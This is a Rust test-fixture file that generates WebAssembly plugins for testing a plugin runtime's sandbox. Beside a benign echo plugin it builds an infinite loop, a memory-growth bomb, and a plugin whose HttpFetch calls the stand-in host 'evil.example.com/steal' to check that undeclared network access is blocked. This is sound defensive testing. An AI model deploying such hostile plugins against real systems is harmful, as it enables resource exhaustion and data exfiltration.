//! WAT sources of the ABI v1 test / fixture plugins (no wasm toolchain
//! needed). Each module exports `memory`, a bump `orkestr_alloc` and
//! `orkestr_call`; see [`crate::abi`].

/// Escapes a string for a WAT data segment.
fn esc(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

const ALLOC: &str = r#"
  (global $hp (mut i32) (i32.const 4096))
  (func $alloc (export "orkestr_alloc") (param $n i32) (result i32) (local $p i32)
    (local.set $p (global.get $hp))
    (global.set $hp (i32.add (local.get $p) (local.get $n)))
    (block $ok
      (loop $grow
        (br_if $ok (i32.le_u (global.get $hp) (i32.mul (memory.size) (i32.const 65536))))
        (if (i32.eq (memory.grow (i32.const 1)) (i32.const -1)) (then unreachable))
        (br $grow)))
    (local.get $p))
  (func $pack (param $p i32) (param $l i32) (result i64)
    (i64.or (i64.shl (i64.extend_i32_u (local.get $p)) (i64.const 32)) (i64.extend_i32_u (local.get $l))))
"#;

fn module(datas: &[(u32, &str)], body: &str) -> String {
    let data: String = datas.iter().map(|(off, s)| format!("  (data (i32.const {off}) \"{}\")\n", esc(s))).collect();
    format!(
        "(module\n  (import \"orkestr\" \"host_call\" (func $host (param i32 i32) (result i64)))\n  (memory (export \"memory\") 1)\n{data}{ALLOC}{body})\n"
    )
}

/// Host request of [`hello`]: one `Log` call.
pub const HELLO_LOG_REQUEST: &str = r#"{"op":"Log","input":{"level":"info","message":"hello called"}}"#;

/// `hello`: logs once through the host, then returns `{"ok":{"echo": <call request>}}`.
#[must_use]
pub fn hello() -> String {
    let prefix = r#"{"ok":{"echo":"#;
    let body = format!(
        r#"
  (func (export "orkestr_call") (param $ptr i32) (param $len i32) (result i64) (local $out i32) (local $total i32)
    (drop (call $host (i32.const 64) (i32.const {log_len})))
    (local.set $total (i32.add (local.get $len) (i32.const {extra})))
    (local.set $out (call $alloc (local.get $total)))
    (memory.copy (local.get $out) (i32.const 16) (i32.const {plen}))
    (memory.copy (i32.add (local.get $out) (i32.const {plen})) (local.get $ptr) (local.get $len))
    (memory.copy (i32.add (i32.add (local.get $out) (i32.const {plen})) (local.get $len)) (i32.const 40) (i32.const 2))
    (call $pack (local.get $out) (local.get $total)))
"#,
        log_len = HELLO_LOG_REQUEST.len(),
        plen = prefix.len(),
        extra = prefix.len() + 2,
    );
    module(&[(16, prefix), (40, "}}"), (64, HELLO_LOG_REQUEST)], &body)
}

/// Infinite loop (stopped by the epoch deadline, fuel or the kill switch).
#[must_use]
pub fn infinite_loop() -> String {
    module(
        &[],
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    (loop $l (br $l))
    (i64.const 0))
"#,
    )
}

/// Grows memory until the store limit traps.
#[must_use]
pub fn memory_bomb() -> String {
    module(
        &[],
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    (loop $l
      (drop (memory.grow (i32.const 16)))
      (br $l))
    (i64.const 0))
"#,
    )
}

/// Host request of [`fetch`]: an `HttpFetch` to a host no manifest grants.
pub const FETCH_REQUEST: &str = r#"{"op":"HttpFetch","input":{"url":"https://evil.example.com/steal"}}"#;

/// Calls `HttpFetch` on an undeclared host and returns the host's reply verbatim.
#[must_use]
pub fn fetch() -> String {
    let body = format!(
        r#"
  (func (export "orkestr_call") (param i32 i32) (result i64)
    (call $host (i32.const 64) (i32.const {len})))
"#,
        len = FETCH_REQUEST.len()
    );
    module(&[(64, FETCH_REQUEST)], &body)
}

/// Compiles WAT text to wasm bytes.
///
/// # Errors
/// Invalid WAT.
pub fn to_wasm(src: &str) -> Result<Vec<u8>, crate::PluginError> {
    wat::parse_str(src).map_err(|e| crate::PluginError::Internal(format!("wat: {e}")))
}

// Compatibility aliases used by the runtime tests.
pub(crate) const HELLO: &str = "hello";
pub(crate) const LOOP: &str = "loop";
pub(crate) const MEMORY_BOMB: &str = "bomb";
pub(crate) const FETCH: &str = "fetch";

/// Source of a fixture by short name (`hello`, `loop`, `bomb`, `fetch`).
#[must_use]
pub fn by_name(name: &str) -> Option<String> {
    match name {
        HELLO => Some(hello()),
        LOOP => Some(infinite_loop()),
        MEMORY_BOMB => Some(memory_bomb()),
        FETCH => Some(fetch()),
        _ => None,
    }
}
